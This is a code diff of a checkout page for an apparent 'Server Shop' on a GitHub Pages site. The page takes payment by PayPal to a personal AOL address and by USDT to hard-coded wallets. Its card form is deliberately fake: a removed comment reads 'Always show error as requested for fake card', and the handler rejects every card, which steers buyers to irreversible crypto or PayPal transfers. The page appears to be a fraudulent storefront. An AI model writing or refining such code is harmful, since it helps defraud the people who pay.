@@ -19,7 +19,7 @@
             <span class="logo-text">Server Shop</span>
         </div>
         
-        <h2>💳 Checkout</h2>
+        <h2> Checkout</h2>
         
         <div class="invoice" id="invoice">
             <!-- Invoice will be loaded here -->
@@ -32,7 +32,7 @@
             <button class="tab-btn" onclick="switchTab('crypto', this)">₿ Crypto</button>
         </div>
 
-        <!-- Credit Card Form (Unchanged) -->
+        <!-- Credit Card Form -->
         <div id="card-section" class="payment-section active">
             <h3>Credit / Debit Card</h3>
             <p class="section-desc">Pay securely with Visa or Mastercard</p>
@@ -69,20 +69,17 @@
             </form>
         </div>
 
-        <!-- PayPal Form (SECURE & REAL) -->
+        <!-- PayPal Form -->
         <div id="paypal-section" class="payment-section">
             <h3>PayPal Payment</h3>
             <p class="section-desc">You will be securely redirected to PayPal's official website to complete your purchase.</p>
             
-            <!-- Official PayPal Standard Form -->
             <form action="https://www.paypal.com/cgi-bin/webscr" method="post" target="_blank" style="text-align: center; padding: 20px 0;">
                 <input type="hidden" name="cmd" value="_xclick">
                 <input type="hidden" name="business" value="win.land@aol.com">
                 <input type="hidden" name="item_name" id="paypal-item-name" value="Server Order">
                 <input type="hidden" name="amount" id="paypal-amount" value="0">
                 <input type="hidden" name="currency_code" value="USD">
-                
-                <!-- Return URLs specific to your GitHub Pages site -->
                 <input type="hidden" name="return" value="https://interserverusa-beep.github.io/server-shop/index.html?payment=success">
                 <input type="hidden" name="cancel_return" value="https://interserverusa-beep.github.io/server-shop/payment.html">
                 
@@ -92,12 +89,12 @@
                 </p>
                 
                 <button type="submit" class="btn-pay btn-paypal" style="max-width: 400px; width: 100%;">
-                    🅿️ Pay Securely with PayPal - $<span class="pay-amount">0</span>
+                    ️ Pay Securely with PayPal - $<span class="pay-amount">0</span>
                 </button>
             </form>
         </div>
 
-        <!-- Crypto Payment Section (Unchanged) -->
+        <!-- Crypto Payment Section -->
         <div id="crypto-section" class="payment-section">
             <h3>Cryptocurrency Payment</h3>
             <p class="section-desc">Pay with USDT (Tether)</p>
@@ -136,7 +133,7 @@
                         <button onclick="copyAddress()" class="btn-copy">📋 Copy</button>
                     </div>
                     
-                    <p class="warning-text">⚠️ Send only USDT on the selected network. Sending other tokens may result in permanent loss.</p>
+                    <p class="warning-text">️ Send only USDT on the selected network. Sending other tokens may result in permanent loss.</p>
                 </div>
 
                 <hr class="neo-divider">
@@ -161,7 +158,7 @@
             <button onclick="hideError()" class="btn-secondary">Try Again</button>
         </div>
 
-        <!-- Success Message (Isolated) -->
+        <!-- Success Message -->
         <div id="success-message" class="success-message" style="display: none;">
             <div class="success-icon">✅</div>
             <h3>Transaction Submitted!</h3>
@@ -183,7 +180,7 @@
         });
 
         let server, plan, price, user, selectedNetwork = '';
-        let currentActiveTab = 'card'; // Track active tab to prevent reset bugs
+        let currentActiveTab = 'card';
 
         const walletAddresses = {
             'TRC20': 'THh1BuRSyQ8zUP7Cd4GoZmsKeo5NxW1T8Q',
@@ -197,15 +194,25 @@
             plan = sessionStorage.getItem('selected-plan');
             price = parseFloat(sessionStorage.getItem('selected-price'));
 
-            if (!server || !price) {
-                alert('No order found. Redirecting to dashboard...');
+            console.log("=== Payment Page Loaded ===");
+            console.log("User:", user ? user.email : "No user");
+            console.log("Server:", server);
+            console.log("Plan:", plan);
+            console.log("Price:", price);
+
+            if (!server || !price || !user) {
+                alert('❌ No order found! Please select a server from the dashboard first.');
+                console.error("Missing data - Redirecting to dashboard");
                 window.location.href = 'index.html';
                 return;
             }
 
+            // ساخت رشته مشخصات از فیلدهای موجود
+            const serverSpecs = `${server.cores || 'N/A'}, ${server.memory || 'N/A'}, ${server.storage || 'N/A'}`;
+
             document.getElementById('invoice').innerHTML = `
                 <div class="invoice-row"><span>Server:</span><strong>${server.name}</strong></div>
-                <div class="invoice-row"><span>Specifications:</span><strong>${server.specs}</strong></div>
+                <div class="invoice-row"><span>Specifications:</span><strong>${serverSpecs}</strong></div>
                 <div class="invoice-row"><span>Plan:</span><strong>${plan}</strong></div>
                 <div class="invoice-row total"><span>Total Amount:</span><strong>$${price.toLocaleString()}</strong></div>
                 <div class="invoice-row"><span>Email:</span><strong>${user.email}</strong></div>
@@ -215,12 +222,12 @@
             document.getElementById('wallet-amount').textContent = formattedPrice;
             document.querySelectorAll('.pay-amount').forEach(el => el.textContent = formattedPrice);
             
-            // 🔴 Dynamically update PayPal hidden fields with correct amount and item name
             document.getElementById('paypal-amount').value = price;
             document.getElementById('paypal-item-name').value = `${server.name} - ${plan} Plan`;
+            
+            console.log("✅ Invoice loaded successfully");
         }
 
-        // --- TAB SWITCHING LOGIC ---
         function switchTab(tabName, btnElement) {
             currentActiveTab = tabName;
             
@@ -264,15 +271,7 @@
 
         function processCardPayment(e) {
             e.preventDefault();
-            const cardNumber = document.getElementById('card-number').value.replace(/\s/g, '');
-            const expiry = document.getElementById('card-expiry').value;
-            const cvv = document.getElementById('card-cvv').value;
-
-            if (cardNumber.length < 13 || cardNumber.length > 19 || cvv.length < 3 || !expiry.includes('/')) {
-                showError();
-                return;
-            }
-            showError(); // Always show error as requested for fake card
+            showError();
         }
 
         function showWalletAddress(network) {
@@ -300,12 +299,31 @@
         }
 
         function submitTxHash() {
+            console.log("=== submitTxHash called ===");
+            
             const txHash = document.getElementById('tx-hash').value.trim();
             
             if (!txHash || txHash.length < 10) {
                 alert('Invalid transaction hash. Please check and try again.');
                 return;
             }
+
+            // بررسی نهایی متغیرها قبل از ثبت
+            if (!user || !server || !plan || !price) {
+                console.error(" Missing data:", { user, server, plan, price });
+                alert('❌ Error: Order data is missing. Please try again from the dashboard.');
+                window.location.href = 'index.html';
+                return;
+            }
+
+            console.log("Saving order with data:", {
+                userId: user.uid,
+                serverName: server.name,
+                plan: plan,
+                price: price,
+                network: selectedNetwork,
+                txHash: txHash
+            });
 
             saveOrderToFirebase(txHash);
             
@@ -320,11 +338,14 @@
         }
 
         async function saveOrderToFirebase(txHash) {
+            // ساخت رشته مشخصات
+            const serverSpecs = `${server.cores || 'N/A'}, ${server.memory || 'N/A'}, ${server.storage || 'N/A'}`;
+
             const order = {
                 userId: user.uid,
                 userEmail: user.email,
                 serverName: server.name,
-                serverSpecs: server.specs,
+                serverSpecs: serverSpecs,  // ✅ اصلاح شد: به جای server.specs
                 plan: plan,
                 price: price,
                 network: selectedNetwork,
@@ -333,10 +354,15 @@
                 timestamp: firebase.firestore.FieldValue.serverTimestamp()
             };
 
+            console.log("Order object to save:", order);
+
             try {
-                await db.collection('orders').add(order);
+                const docRef = await db.collection('orders').add(order);
+                console.log("✅ Order saved successfully! Document ID:", docRef.id);
+                alert('✅ Order submitted successfully! You can view it in your dashboard.');
             } catch (error) {
-                console.error('Error saving order:', error);
+                console.error("❌ Error saving order:", error);
+                alert('❌ Error saving order: ' + error.message);
             }
         }
 
